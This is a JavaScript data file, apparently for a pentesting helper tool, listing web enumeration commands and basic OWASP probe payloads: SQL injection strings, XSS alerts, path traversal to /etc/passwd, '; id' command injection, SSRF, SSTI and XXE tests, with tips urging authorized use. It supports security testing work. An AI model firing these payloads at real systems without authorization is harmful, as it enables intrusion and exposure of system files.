export const payloadDatabase = {
  "Web Enumeration": {

    "Directory Enumeration": [
      {
        name: "Gobuster",
        command: "gobuster dir -u {{target}} -w /usr/share/wordlists/dirb/common.txt",
        description: "Discover common directories and files.",
        tip: "If the target returns wildcard responses, filter the matching status code or response length."
      },
      {
        name: "Feroxbuster",
        command: "feroxbuster -u {{target}}",
        description: "Perform recursive web content discovery.",
        tip: "Use a suitable wordlist and adjust filtering when the server uses wildcard responses."
      },
      {
        name: "Dirsearch",
        command: "dirsearch -u {{target}}",
        description: "Enumerate directories and files.",
        tip: "Review redirects and status codes before interpreting results."
      }
    ],

    "File Enumeration": [
      {
        name: "Gobuster Files",
        command: "gobuster dir -u {{target}} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt",
        description: "Search for common file extensions.",
        tip: "Adjust extensions according to the technology used by the application."
      }
    ],

    "HTTP Headers": [
      {
        name: "Curl Headers",
        command: "curl -I {{target}}",
        description: "Inspect HTTP response headers.",
        tip: "Look for security headers, server information and redirect behavior."
      },
      {
        name: "Full HTTP Response",
        command: "curl -i {{target}}",
        description: "Display headers and response body.",
        tip: "Useful for understanding the application's initial response."
      }
    ],

    "Robots.txt": [
      {
        name: "Robots.txt",
        command: "curl {{target}}/robots.txt",
        description: "Check whether robots.txt references restricted paths.",
        tip: "Robots.txt is informational and should not be treated as an access-control mechanism."
      }
    ],

    "Sitemap": [
      {
        name: "Sitemap.xml",
        command: "curl {{target}}/sitemap.xml",
        description: "Check for an XML sitemap.",
        tip: "Sitemaps can reveal application routes and publicly indexed content."
      }
    ],

    "JavaScript Discovery": [
      {
        name: "Extract JS Files",
        command: "curl -s {{target}} | grep -Eo 'src=\"[^\"]+\\.js[^\"]*\"'",
        description: "Identify JavaScript files referenced by the page.",
        tip: "Review discovered JavaScript for client-side routes and API references during authorized testing."
      }
    ],

    "Endpoint Discovery": [
      {
        name: "Common API Endpoint",
        command: "curl -i {{target}}/api",
        description: "Check for a common API route.",
        tip: "Applications may use different API prefixes."
      },
      {
        name: "Common Login Endpoint",
        command: "curl -i {{target}}/login",
        description: "Check for a common login route.",
        tip: "Use application documentation or normal navigation to identify additional routes."
      }
    ],

    "Virtual Host Discovery": [
      {
        name: "Gobuster VHost",
        command: "gobuster vhost -u {{target}} -w subdomains.txt",
        description: "Test possible virtual host names.",
        tip: "Use only names that are within your authorized testing scope."
      }
    ]
  },


  "OWASP": {

    "SQL Injection": [
      {
        name: "Basic Authentication Test",
        payload: "' OR '1'='1",
        description: "Basic SQL injection input validation test.",
        tip: "Test only controlled parameters and compare normal versus modified responses."
      },
      {
        name: "Comment Test",
        payload: "' OR 1=1 -- ",
        description: "Test whether SQL syntax can be influenced.",
        tip: "Different database engines handle comments differently."
      },
      {
        name: "Numeric Test",
        payload: "1 OR 1=1",
        description: "Test numeric parameters for SQL injection.",
        tip: "Useful when the application expects a numeric identifier."
      }
    ],


    "Cross-Site Scripting (XSS)": [
      {
        name: "Basic XSS",
        payload: "<script>alert(document.domain)</script>",
        description: "Basic reflected or stored XSS test.",
        tip: "Use a harmless proof of concept during authorized testing."
      },
      {
        name: "HTML Context Test",
        payload: "<img src=x onerror=alert(document.domain)>",
        description: "Test HTML or attribute injection.",
        tip: "The correct test depends on the output context and filtering."
      }
    ],


    "IDOR": [
      {
        name: "Object Identifier",
        example: "{{target}}/user/123",
        description: "Test whether changing an object identifier bypasses authorization.",
        tip: "Compare responses using accounts with different authorization levels."
      },
      {
        name: "API Object",
        example: "{{target}}/api/user/123",
        description: "Test authorization around predictable API object identifiers.",
        tip: "Do not access data belonging to real users without authorization."
      }
    ],


    "Path Traversal": [
      {
        name: "Linux Traversal",
        payload: "../../../../etc/passwd",
        description: "Test whether a file path can traverse parent directories.",
        tip: "Use a controlled test environment whenever possible."
      },
      {
        name: "Windows Traversal",
        payload: "..\\..\\..\\..\\Windows\\win.ini",
        description: "Test Windows path traversal.",
        tip: "Path separators and normalization differ between platforms."
      }
    ],


    "Command Injection": [
      {
        name: "Command Separator",
        payload: "; id",
        description: "Test whether shell metacharacters reach a command interpreter.",
        tip: "Use harmless commands for proof of concept."
      },
      {
        name: "Pipe Test",
        payload: "| id",
        description: "Test pipe-based command injection.",
        tip: "Interpret results carefully because applications may sanitize shell metacharacters."
      }
    ],


    "SSRF": [
      {
        name: "Localhost",
        payload: "http://127.0.0.1",
        description: "Test whether the server can make requests to localhost.",
        tip: "Use a controlled endpoint when validating SSRF behavior."
      },
      {
        name: "Loopback",
        payload: "http://localhost",
        description: "Test server-side request handling against loopback.",
        tip: "Avoid probing internal infrastructure you are not authorized to access."
      }
    ],


    "SSTI": [
      {
        name: "Arithmetic Test",
        payload: "{{7*7}}",
        description: "Detect template expression evaluation.",
        tip: "A result of 49 can indicate that an expression was evaluated."
      },
      {
        name: "Expression Test",
        payload: "${7*7}",
        description: "Test expression evaluation in supported template syntaxes.",
        tip: "Template syntax varies between frameworks."
      }
    ],


    "XXE": [
      {
        name: "XML Entity Test",
        payload: "<!DOCTYPE test [ <!ENTITY xxe \"test\"> ]>",
        description: "Test XML parser entity handling.",
        tip: "Use a harmless entity during initial testing."
      }
    ],


    "File Upload": [
      {
        name: "Extension Validation",
        payload: "test.php",
        description: "Test whether upload validation relies only on file extensions.",
        tip: "Use harmless test files rather than executable content."
      },
      {
        name: "Content-Type Validation",
        payload: "Content-Type: image/jpeg",
        description: "Test whether the server trusts client-controlled MIME types.",
        tip: "MIME type alone should not be considered sufficient validation."
      }
    ],


    "CORS Misconfiguration": [
      {
        name: "Origin Test",
        payload: "Origin: https://attacker.example",
        description: "Test whether an untrusted origin is accepted.",
        tip: "Only test with domains under your control."
      }
    ],


    "Security Headers": [
      {
        name: "Header Inspection",
        command: "curl -I {{target}}",
        description: "Inspect security-related HTTP response headers.",
        tip: "Review CSP, HSTS, X-Content-Type-Options and related headers."
      }
    ],


    "Open Redirect": [
      {
        name: "Redirect Parameter",
        example: "{{target}}?redirect=https://example.com",
        description: "Test whether a redirect parameter accepts an external destination.",
        tip: "Use a domain you control when validating redirect behavior."
      }
    ]

  }
};
